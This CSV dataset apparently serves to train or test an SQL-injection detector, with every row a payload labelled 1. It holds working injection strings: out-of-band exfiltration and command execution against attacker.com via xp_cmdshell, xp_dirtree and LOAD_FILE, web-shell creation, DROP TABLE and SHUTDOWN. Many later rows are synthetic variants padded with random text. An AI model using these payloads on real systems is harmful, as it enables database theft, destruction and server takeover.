content,label
'; exec master..xp_dirtree '\\attacker.com\data'--,1
'; exec master..xp_fileexist '\\attacker.com\info'--,1
'; exec master..xp_cmdshell 'ping attacker.com'--,1
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"' UNION SELECT null, null--",1
"' UNION SELECT username, password FROM users--",1
"' UNION SELECT null, null, null--",1
"' AND 1=CONVERT(int, (SELECT @@version))--",1
"' AND 1=CONVERT(int, (SELECT user_name()))--",1
"' AND 1=CONVERT(int, (SELECT db_name()))--",1
"' AND 1=CONVERT(int, (SELECT host_name()))--",1
"' AND 1=CONVERT(int, (SELECT current_user))--",1
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",1
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",1
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",1
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",1
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",1
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",1
"' UNION SELECT username, password FROM users WHERE '1'='1'--",1
'; EXEC xp_cmdshell('nslookup attacker.com')--,1
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",1
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,1
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",1
"' AND IF(1=1,SLEEP(5),0)--",1
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",1
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",1
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",1
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,1
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,1
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",1
'; exec master..xp_dirtree '\\attacker.com\share'--,1
"' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
'; exec master..xp_fileexist '\\attacker.com\test'--,1
' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",1
'; UPDATE users SET password='newpassword' WHERE username='admin'--,1
'; DROP TABLE logs;--,1
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",1
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",1
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,1
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",1
'; UPDATE users SET role='admin' WHERE username='guest'--,1
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",1
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",1
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",1
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",1
'; UPDATE users SET status='active' WHERE username='banneduser'--,1
'; UPDATE orders SET status='shipped' WHERE order_id=1--,1
'; DROP TABLE users;--,1
'; CREATE TABLE test (id INT);--,1
'; INSERT INTO logs (entry) VALUES ('Attacked');--,1
'; UPDATE users SET password='hacked' WHERE username='admin';--,1
'; DELETE FROM orders WHERE order_id=1;--,1
'; EXEC xp_cmdshell('ping attacker.com');--,1
'; SHUTDOWN;--,1
'; ALTER TABLE users ADD COLUMN hacked INT;--,1
'; TRUNCATE TABLE logs;--,1
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,1
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",1
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,1
'; DENY INSERT ON orders TO public;--,1
'; RECONFIGURE;--,1
'; EXEC xp_cmdshell('whoami')--,1
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",1
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,1
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",1
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",1
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,1
'; EXEC sp_who--,1
'; EXEC sp_helpdb--,1
'; EXEC sp_configure--,1
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",1
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,1
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",1
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",1
'; EXEC sp_MSgetversion--,1
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,1
' AND SLEEP(5)--,1
' OR SLEEP(5)--,1
'; WAITFOR DELAY '0:0:5'--,1
"' AND IF(1=1, SLEEP(5), 0)--",1
"' AND IF(1=2, SLEEP(5), 0)--",1
"' OR IF(1=1, SLEEP(5), 0)--",1
"' OR IF(1=2, SLEEP(5), 0)--",1
"' AND BENCHMARK(5000000,MD5('test'))--",1
"' OR BENCHMARK(5000000,MD5('test'))--",1
' AND pg_sleep(5)--,1
'; SELECT pg_sleep(5)--,1
'; WAITFOR DELAY '00:00:05'--,1
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",1
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",1
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",1
"' UNION SELECT 1,2,3--",1
"' UNION SELECT database(), version()--",1
"' UNION SELECT 1, database()--",1
"' UNION SELECT user(), version()--",1
"' UNION SELECT null, table_name FROM information_schema.tables--",1
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,1
"' UNION SELECT username, password FROM members--",1
"' UNION SELECT 1,2,3 FROM dual--",1
"' UNION ALL SELECT null, username, password FROM admin--",1
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",1
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",1
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",1
"' UNION SELECT 1,2,3 WHERE 1=1--",1
' OR 1=1--,1
' OR '1'='1'--,1
' OR 'a'='a'/*,1
' OR 1=1;#,1
' OR '1'='1' AND '1'='1'--,1
' OR username LIKE 'admin%'--,1
"' UNION SELECT null,null--",1
"' UNION/**/SELECT/**/null,null--",1
"' UNION%0aSELECT%0anull,null--",1
"' UNION%09SELECT%09null,null--",1
"' UNION%0d%0aSELECT%0d%0anull,null--",1
"' UNION/*foo*/SELECT/*bar*/null,null--",1
"' OR 1=CONVERT(int, '1')--",1
' OR '1' LIKE '1'--,1
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",1
qirbex3@' AND '1'='1,1
下载 table 14 ' AND '1'='1,1
优势 ' AND '1'='1,1
下载 ' AND '1'='1,1
product 使用方法 ' AND '1'='1,1
好不好 ' AND '1'='2,1
ol1akt1p@' AND '1'='2,1
使用方法 table 26 ' AND '1'='2,1
server 212 ' AND '1'='2,1
去听布资四支确' OR '1'='1,1
好不好 item ' OR '1'='1,1
推荐 ' OR '1'='1,1
tka79czpote@' OR '1'='2,1
bat2t74kr58@' OR '1'='2,1
使用方法 ' OR '1'='2,1
7nfur@' OR '1'='2,1
哪里买 profile 50 ' OR '1'='2,1
推荐 ' AND 1=1,1
使用方法 ' AND 1=1,1
优势 ' AND 1=1,1
功能 product 25 ' AND 1=1,1
怎么样 warning 51 ' AND 1=2,1
力正土府之' AND 1=2,1
局切好' AND 1=2,1
polm5yarg1z5@' AND 1=2,1
5xpef95b@' AND 1=2,1
mqhd9uj@' OR 1=1,1
变总进极品' OR 1=1,1
教程 ' OR 1=1,1
2024 ' OR 1=1,1
与空场件心再铁业用' OR 1=2,1
使用方法 ' OR 1=2,1
account 教程 ' OR 1=2,1
选气信石立程又照已' OR 1=2,1
党取声强标收切必数结类则品织' AND (SELECT COUNT(*) FROM users)>0,1
排名 ' AND (SELECT COUNT(*) FROM users)>0,1
设革放次成她路大极高样队产话作' AND (SELECT COUNT(*) FROM users)>0,1
profile 579 ' AND (SELECT COUNT(*) FROM users)>0,1
对比 ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
特点 ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
cp1ydqk19@' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
业海斗清处种制' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
排名 ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
八最今王还量生称效' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
3v3868uh9xm@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
值然公压成保日' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
8112b3@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
rj5vmcow6bk@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
"名小气照心理况是关除当到国工' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"使用方法 login 98 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"时道光治满局' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"建斗调带阶常' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"则分号人办元布流代' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"教程 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"多少钱 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"来增展存格们容你达' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
data 321 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
么车可队证制常量满' AND (SELECT 1 FROM dual) IS NOT NULL,1
怎么样 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
o4pdlh7zma5@' AND (SELECT 1 FROM dual) IS NOT NULL,1
r72zrt@' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
起商发型么交增很员中况而专声' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
料律得果改状求深地济学联你那' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
评测 test ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
如何 fail 19 ' AND '1'='1,1
功能 ' AND '1'='1,1
warning 什么是 ' AND '1'='1,1
zo2ec998b@' AND '1'='1,1
对比 error ' AND '1'='1,1
功能 fail ' AND '1'='2,1
系周部务书常才清' AND '1'='2,1
市记两大与则再至以不里住则验可' AND '1'='2,1
info 590 ' AND '1'='2,1
共劳商水热格适集' OR '1'='1,1
推荐 account 28 ' OR '1'='1,1
怎么样 query ' OR '1'='1,1
huuvuudbh4@' OR '1'='2,1
info 价格 ' OR '1'='2,1
好不好 table ' OR '1'='2,1
raqz2fwegwr@' AND 1=1,1
务没军形组' AND 1=1,1
admin 994 ' AND 1=1,1
最新 ' AND 1=2,1
子声热加王一儿色养示将置' AND 1=2,1
9daivdlrh@' AND 1=2,1
六济究白小结生还山明' AND 1=2,1
市百没命交较等法打压意最表' OR 1=1,1
多少钱 ' OR 1=1,1
bc5scjh@' OR 1=1,1
多少钱 ' OR 1=2,1
2024 order ' OR 1=2,1
什么是 ' OR 1=2,1
教程 user ' OR 1=2,1
对比 ' AND (SELECT COUNT(*) FROM users)>0,1
怎么样 database 20 ' AND (SELECT COUNT(*) FROM users)>0,1
最新 ' AND (SELECT COUNT(*) FROM users)>0,1
对计斗团便次三型单这他世市与式' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
法便们历去选系把' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
item 840 ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
主在称' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
样确往花程月使马手发住节路关' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
01zu8s@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
rt68ogt@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
"使用方法 warning ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"新数料权原利却离' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"对断记通层影般' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"2024 user ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"好不好 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"排名 login 13 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"评测 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
error 786 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
多少钱 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
如何 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
接业集' AND (SELECT 1 FROM dual) IS NOT NULL,1
data 949 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
示门可圆' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
82qm5a7xxtt2@' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
酸类去然音' AND '1'='1,1
你节知' AND '1'='1,1
整产关我组酸白' AND '1'='1,1
什么是 user 13 ' AND '1'='2,1
什么是 ' AND '1'='2,1
评测 ' AND '1'='2,1
ejnowos1@' AND '1'='2,1
search 893 ' AND '1'='2,1
test 怎么样 ' OR '1'='1,1
product 410 ' OR '1'='1,1
c5yvdypmrds@' OR '1'='1,1
info 581 ' OR '1'='2,1
z0illq5i0@' OR '1'='2,1
srqax7kw3@' OR '1'='2,1
好不好 error ' OR '1'='2,1
使用方法 account ' AND 1=1,1
如何 ' AND 1=1,1
多少钱 table 78 ' AND 1=1,1
data 哪里买 ' AND 1=1,1
wbss3gajrh@' AND 1=2,1
query 推荐 ' AND 1=2,1
8n9qkrpss@' AND 1=2,1
特点 ' OR 1=1,1
情何无速报与包后使世式才非织出' OR 1=1,1
排名 ' OR 1=1,1
下载 login ' OR 1=1,1
部验有计物包石积' OR 1=2,1
tx13aaadi@' OR 1=2,1
打今个两使会率单越' OR 1=2,1
事转千' OR 1=2,1
umiwe9@' AND (SELECT COUNT(*) FROM users)>0,1
功能 ' AND (SELECT COUNT(*) FROM users)>0,1
划头因起老论细金美料' AND (SELECT COUNT(*) FROM users)>0,1
如何 ' AND (SELECT COUNT(*) FROM users)>0,1
info 448 ' AND (SELECT COUNT(*) FROM users)>0,1
什么是 system ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
5wtbnn96e@' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
64mm3r@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
7bvxqy08w@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
内张派收整口立' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
hxiluwyusyev@' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
"文理次千常天群命群角至京华复' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"越期火存至元红它过多合非南律' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"success 994 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"优势 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"fjccrh7@' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"login 价格 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"合量况率完生日会真别件' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
query 下载 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
success 好不好 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
data 推荐 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
最新 password 84 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
tx4ep4y83@' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
server 如何 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
怎么样 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
user 351 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
优势 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
info 735 ' AND '1'='1,1
如何 admin 41 ' AND '1'='1,1
报称积周红上类义电实' AND '1'='1,1
特点 ' AND '1'='1,1
好不好 ' AND '1'='1,1
view 143 ' AND '1'='2,1
cp1tz@' AND '1'='2,1
好不好 database ' AND '1'='2,1
对比 ' AND '1'='2,1
门验证满空通这门位里数水' OR '1'='1,1
功能 ' OR '1'='1,1
如何 ' OR '1'='1,1
对比 ' OR '1'='1,1
对比 ' OR '1'='2,1
怎么样 ' OR '1'='2,1
3arzuff@' OR '1'='2,1
login 教程 ' OR '1'='2,1
password 好不好 ' AND 1=1,1
i3l0dbdgynga@' AND 1=1,1
yq87i7evp5ct@' AND 1=1,1
oalvy8@' AND 1=2,1
排名 ' AND 1=2,1
推荐 user ' AND 1=2,1
好不好 ' AND 1=2,1
头价民据南较式号去农速基' OR 1=1,1
p4notbf5uuzc@' OR 1=1,1
mz2rl4yb19x@' OR 1=1,1
走取行示记没变' OR 1=2,1
对比 ' OR 1=2,1
好不好 ' OR 1=2,1
8wi0uqq6ae@' AND (SELECT COUNT(*) FROM users)>0,1
价格 ' AND (SELECT COUNT(*) FROM users)>0,1
r2kuu@' AND (SELECT COUNT(*) FROM users)>0,1
特点 ' AND (SELECT COUNT(*) FROM users)>0,1
最新 ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
据际会' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
功能 ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
求正名重众出间口际除住' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
怎么样 ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
"ewbgt2yn@' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"白了争本务展型热同门国音' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"8khcjmatnk@' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"圆青非革解件战西老回想群装' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"至今这委矿比议天多合习' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"值许无由第运际转外研造' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"口变动议将般习包下例别' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"2024 account ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
9sbxbt1hj@' AND (SELECT 1 FROM dual) IS NOT NULL,1
是个置采团类厂' AND (SELECT 1 FROM dual) IS NOT NULL,1
养族农清许群报厂因可没力整性' AND (SELECT 1 FROM dual) IS NOT NULL,1
前面时容儿领属于入九很问增阶七' AND (SELECT 1 FROM dual) IS NOT NULL,1
整始法着可复了联头验身八长住' AND (SELECT 1 FROM dual) IS NOT NULL,1
劳门铁家全号干科' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
人个边次风即量们花队条' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
推荐 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
优势 user ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
排名 error 51 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
资比步验' AND '1'='1,1
t1y76@' AND '1'='1,1
什么是 database ' AND '1'='1,1
w3ijo9fblqd@' AND '1'='2,1
推荐 ' AND '1'='2,1
0p0phl@' AND '1'='2,1
5s4fbdxuggq@' AND '1'='2,1
教程 ' OR '1'='1,1
地办物改青质表火酸主山因省' OR '1'='1,1
直及色高回极元意处思产活' OR '1'='1,1
tmxj5lg1h78f@' OR '1'='2,1
优势 ' OR '1'='2,1
将除且选' AND 1=1,1
product 214 ' AND 1=1,1
推荐 warning ' AND 1=1,1
但过准构流资面根务力料' AND 1=1,1
准务然认门克却马' AND 1=1,1
table 957 ' AND 1=2,1
xc4d2unk@' AND 1=2,1
rkxb5z@' AND 1=2,1
哪里买 ' AND 1=2,1
otr02@' OR 1=1,1
如何 ' OR 1=1,1
profile 519 ' OR 1=1,1
推荐 ' OR 1=2,1
如何 error 24 ' OR 1=2,1
功能 ' OR 1=2,1
vs1fj99@' OR 1=2,1
rii0nl5z1@' AND (SELECT COUNT(*) FROM users)>0,1
tnompz4@' AND (SELECT COUNT(*) FROM users)>0,1
料院还干世联提' AND (SELECT COUNT(*) FROM users)>0,1
取而各科价着全又照标走知品约半' AND (SELECT COUNT(*) FROM users)>0,1
教程 error ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
j4y5sygdx9z@' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
多少钱 ' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
d5qh46lbw@' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
z09iam6qa@' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
多少钱 ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
system 最新 ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
权越亲' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
总书议派全大元们内命受心' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
红万常清' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
"database 好不好 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"特点 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"fd26tglzhnu@' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"profile 最新 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"科作头身' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"tj1h7ax@' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"error 818 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"哪里买 ' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"条求中声世想见体过' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
"厂委性得年活' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
database 722 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
d7q8deuw@' AND (SELECT 1 FROM dual) IS NOT NULL,1
database 731 ' AND (SELECT 1 FROM dual) IS NOT NULL,1
干石快动日保走几性' AND (SELECT 1 FROM dual) IS NOT NULL,1
点自圆置' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
律七年斯约太下' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
login 优势 ' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
现打变边之作管先力期起即边称' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
